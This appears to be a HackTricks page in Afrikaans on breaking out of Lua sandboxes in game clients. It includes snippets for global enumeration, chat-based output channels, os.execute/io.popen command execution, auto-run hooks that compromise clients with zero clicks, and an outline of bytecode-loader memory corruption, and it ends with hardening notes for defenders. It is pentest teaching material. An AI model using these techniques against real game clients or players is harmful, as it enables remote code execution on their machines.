# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Hierdie bladsy versamel praktiese tegnieke om Lua-"sandboxes" wat in toepassings ingebed is (veral game clients, plugins of scripting engines binne toepassings) te enumerate en uit te breek. Baie engines stel 'n beperkte Lua-omgewing bloot, maar laat kragtige globals bereikbaar wat arbitrary command execution moontlik maak, of selfs native memory corruption wanneer bytecode loaders blootgestel word.

Sleutelidees:
- Behandel die VM as 'n onbekende omgewing: enumerateer _G en ontdek watter gevaarlike primitives bereikbaar is.
- Wanneer stdout/print geblokkeer word, misbruik enige in-VM UI/IPC-kanaal as 'n output sink om resultate waar te neem.
- As io/os blootgestel word, het jy dikwels direkte command execution (io.popen, os.execute).
- As load/loadstring/loadfile blootgestel word, kan die uitvoering van crafted Lua bytecode memory safety in sommige weergawes ondermyn (≤5.1 verifiers is bypassable; 5.2 het verifier verwyder), wat advanced exploitation moontlik maak.

## Enumerateer die sandboxed environment

- Dump die global environment om bereikbare tables/functions te inventariseer:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Indien geen print() beskikbaar is nie, hergebruik in-VM-kanale. Voorbeeld uit 'n MMO-huisvestingskrip-VM waar kletsuitset slegs ná 'n klankaanroep werk; die volgende bou 'n betroubare uitsetfunksie:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Veralgemeen hierdie patroon vir jou teiken: enige tekskassie, toast, logger of UI-callback wat stringe aanvaar, kan as stdout vir reconnaissance dien.

## Direkte command execution indien io/os blootgestel is

As die sandbox steeds die standaardbiblioteke io of os blootstel, het jy waarskynlik onmiddellike command execution:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:

- Uitvoering gebeur binne die client process; baie anti-cheat/antidebug-lae wat eksterne debuggers blokkeer, sal nie die skepping van prosesse binne die VM voorkom nie.
- Kyk ook na: package.loadlib (laai van arbitrêre DLL/.so), require met native modules, LuaJIT se ffi (indien beskikbaar), en die debug library (kan privileges binne die VM verhoog).

## Zero-click triggers via auto-run callbacks

As die host application scripts na clients stoot en die VM auto-run hooks blootstel (bv. OnInit/OnLoad/OnEnter), plaas jou payload daar vir drive-by compromise sodra die script laai:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Enige ekwivalente callback (OnLoad, OnEnter, ens.) veralgemeen hierdie tegniek wanneer scripts outomaties na die client gestuur en daar uitgevoer word.

## Gevaarlike primitives om tydens recon te soek

Tydens _G-enumerasie, let spesifiek op:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: execute source or bytecode; supports loading untrusted bytecode.
- package, package.loadlib, require: dynamic library loading and module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.

Minimale usage examples (indien bereikbaar):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Opsionele eskalasie: misbruik van Lua bytecode loaders

Wanneer load/loadstring/loadfile bereikbaar is, maar io/os beperk word, kan die uitvoering van vervaardigde Lua bytecode lei tot memory disclosure- en corruption-primitives. Sleutelfeite:
- Lua ≤ 5.1 het ’n bytecode verifier ingesluit wat bekende bypasses het.<sup>[[4]](#references)</sup>
- Lua 5.2 het die verifier heeltemal verwyder (amptelike standpunt: toepassings behoort bloot voorafgecompileerde chunks te verwerp), wat die attack surface verbreed indien bytecode loading nie verbied word nie.<sup>[[2]](#references)[[3]](#references)</sup>
- Workflows volg tipies hierdie patroon: leak pointers via in-VM output, vervaardig bytecode om type confusions te skep (byvoorbeeld rondom FORLOOP of ander opcodes), en pivot dan na arbitrary read/write of native code execution.<sup>[[2]](#references)[[4]](#references)</sup>

Hierdie pad is engine-/version-specific en vereis RE. Sien die references vir diepgaande ontledings, exploitation primitives en voorbeeld-gadgetry in games.

## Detection- en hardening-notas (vir defenders)

- Server side: verwerp of herskryf user scripts; allowlist veilige APIs; verwyder of bind-leeg io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: voer Lua met ’n minimale _ENV uit, verbied bytecode loading, stel ’n streng bytecode verifier of signature checks weer in, en blokkeer process creation vanaf die client process.
- Telemetry: genereer ’n alert vir gameclient → child process creation kort ná script load; korreleer dit met UI/chat/script events.

## References

- [1] [Hierdie huis spook: ’n dekade-oue RCE in die AION-client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Die ontrafeling van Factorio se Lua-security flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Bespreking oor die verwydering van die bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist met verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
